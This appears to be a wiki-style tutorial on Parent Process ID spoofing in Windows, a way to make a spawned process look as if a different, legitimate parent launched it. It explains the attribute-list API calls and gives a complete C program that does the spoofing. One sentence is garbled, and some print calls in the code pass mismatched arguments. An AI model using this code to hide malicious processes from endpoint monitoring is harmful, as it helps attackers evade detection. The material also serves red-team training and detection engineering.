---
description: >-
  Parent Process ID (PPID) Spoofing is a technique used to alter the PPID of a
  process, effectively disguising the relationship between the child process and
  its true parent process.
---

# PPID Spoofing

[Parent Process ID (PPID) Spoofing](https://attack.mitre.org/techniques/T1134/004/) can make it appear as though a process was spawned by a different legitimate Windows process rather than the true parent process.

<mark style="color:red;">**NOTE:**</mark> Security solutions will often look for abnormal parent-child relationships. For example, if Microsoft Word spawns `cmd.exe` this is generally an indicator of malicious macros being executed. If `cmd.exe` is spawned with a different PPID then it will conceal the true parent process and instead appear as if it was spawned by a different process.



## Attribute List

PPID Spoofing requires the use and manipulation of a process's attributes list to modify its PPID.

An attribute list is a data structure that stores a list of attributes associated with a process or thread. Attribute lists can be used to efficiently store and retrieve information about processes and threads, as well as to modify the attributes of a process or thread at runtime. They contain information about state, CPU, and memory.



## Implementation

The steps below sum up the required actions to perform PPID spoofing.

1. `CreateProcessA` is called with the `EXTENDED_STARTUPINFO_PRESENT` flag to provide further control over the created process.
2. The `STARTUPINFOEXA` structure is created which contains the attributes list, `LPPROC_THREAD_ATTRIBUTE_LIST`.
3. `InitializeProcThreadAttributeList` is called to initialize the attributes list. The function must be called twice, the first time determines the size of the attributes list and the next call is the one that performs the initialization.
4. `UpdateProcThreadAttribute` is used to update the attributes by setting the `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` flag which allow the user to specify the parent process of the thread.

### Create a Process

First we create a process witha

flag being set which is used to give further control of the created process. This flag allows us to modify PPID information.

Microsoft's documentation on `EXTENDED_STARTUPINFO_PRESENT` states the following:

_The process is created with extended startup information; the lpStartupInfo parameter specifies a STARTUPINFOEX structure. (Necessary for EXTENDED\_STARTUPINFO\_PRESENT)_

#### STARTUPINFOEXA Structure

The `STARTUPINFOEXA` data structure is shown below:

```c
typedef struct _STARTUPINFOEXA {
  STARTUPINFOA                 StartupInfo;
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList; // Attributes List
} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
```

* `StartupInfo` -  The only member that needs to be set is `cb` to `sizeof(STARTUPINFOEX)`.
* `lpAttributeList` This is the attribute list. Created with [InitializeProcThreadAttributeList](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist) function.

### Initializing The Attribute List

The `InitializeProcThreadAttributeList` function is shown below.

```c
BOOL InitializeProcThreadAttributeList(
  [out, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [in]            DWORD                        dwAttributeCount,
                  DWORD                        dwFlags, 		// NULL (reserved)
  [in, out]       PSIZE_T                      lpSize
);
```

According to Microsoft's documentation, `InitializeProcThreadAttributeList` must be called twice:

1. The first call to `InitializeProcThreadAttributeList` should be `NULL` for the `lpAttributeList` parameter. This call is used to determine the size of the attribute list which will be received from the `lpSize` parameter.
2. The second call to `InitializeProcThreadAttributeList` should specify a valid pointer for the `lpAttributeList` parameter. The value of `lpSize` should be provided as input this time. This call is the one that initializes the attributes list.

`dwAttributeCount` will be set to 1 since only one attribute list is needed.

### Updating The Attribute List

Once the attribute list has been successfully initialized, use the [UpdateProcThreadAttribute](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute) WinAPI to add attributes to the list. The function is shown below.

```c
BOOL UpdateProcThreadAttribute(
  [in, out]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,   // return value from InitializeProcThreadAttributeList 
  [in]            DWORD                        dwFlags,           // NULL (reserved)
  [in]            DWORD_PTR                    Attribute,
  [in]            PVOID                        lpValue,           // pointer to the attribute value
  [in]            SIZE_T                       cbSize,            // sizeof(lpValue)
  [out, optional] PVOID                        lpPreviousValue,   // NULL (reserved)
  [in, optional]  PSIZE_T                      lpReturnSize       // NULL (reserved)
);
```

* `Attribute` - This flag is critical for PPID spoofing and states what should be updated in the attribute list. In this case, it needs to be set to the `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` flag to update the parent process information.

The `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` flag specifies the parent process of the thread. In general, the parent process of a thread is the process that created the thread. If a thread is created using the `CreateThread` function, the parent process is the one that called the `CreateThread` function. If a thread is created as part of a new process using the `CreateProcess` function, the parent process is the new process. Updating the parent process of a thread will also update the parent process of the associated process.

* `lpValue` - The handle of the parent process.
* `cbSize` - The size of the attribute value specified by the `lpValue` parameter. This will be set to `sizeof(HANDLE)`.



## PPID Spoofing Function Code

```c
#include <stdio.h>
#include <wchar.h>
#include <windows.h>

int wmain(int argc, wchar_t* argv[]) {

    if (argc < 2) {
        wprintf(L"Insufficient Arguments Passed to Main Function!\n");
        return -1;
    }

    DWORD PID = _wtoi(argv[1]);

    HANDLE hProcess = NULL;

    STARTUPINFOEXA lpStartupInfoEx = { 0 };
    PROCESS_INFORMATION lpProcessInfo = { 0 };


	SIZE_T                             sThreadAttList       = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList       = NULL;


    RtlSecureZeroMemory(&lpStartupInfoEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&lpProcessInfo, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	lpStartupInfoEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) {
        wprintf(L"Failed to Open Process PID: %d Error Code: %d\n",PID, GetLastError());
        return -1;
    }

    // This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);	

	// Allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL){
		wprintf(L"[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		wprintf(L"[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return -1;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL)) {
		wprintf(L"[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
	// created using UpdateProcThreadAttribute - that is the parent process
	lpStartupInfoEx.lpAttributeList = pThreadAttList;

    if (!CreateProcessA(
        NULL,
        "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding",
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &lpStartupInfoEx.StartupInfo,
        &lpProcessInfo
    )) {
        wprintf(L"CreateProcessA Failed with Error Code: %d\n");
        return -1;
    }

    wprintf(L"Created Process!", lpProcessInfo.dwProcessId);

    DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hProcess);
    getchar(); 
    return 0;
}
```
